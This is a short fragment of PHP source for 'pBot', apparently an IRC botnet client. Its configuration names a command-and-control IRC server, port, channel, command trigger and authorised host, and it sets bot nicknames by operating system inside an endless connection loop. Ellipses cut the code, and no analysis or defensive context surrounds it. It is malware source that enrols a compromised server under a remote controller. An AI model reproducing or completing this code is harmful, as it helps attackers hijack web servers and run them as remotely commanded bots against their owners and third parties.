...
class pBot
{
 var $config = array("server"=>"irc.pitchblack.us", "port"=>"6667","key"=>"","prefix"=>"BotID", "maxrand"=>"6", "chan"=>"##hash##","trigger"=>"-","hostauth"=>"127.0.0.1"); 
 var $users = array(); 
 function start()
 {
    while(true)
 ...
 {
    $this->nick = "";
    if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') $this->nick .= "[PBnJ]";
    else $this->nick .= "[PB]";
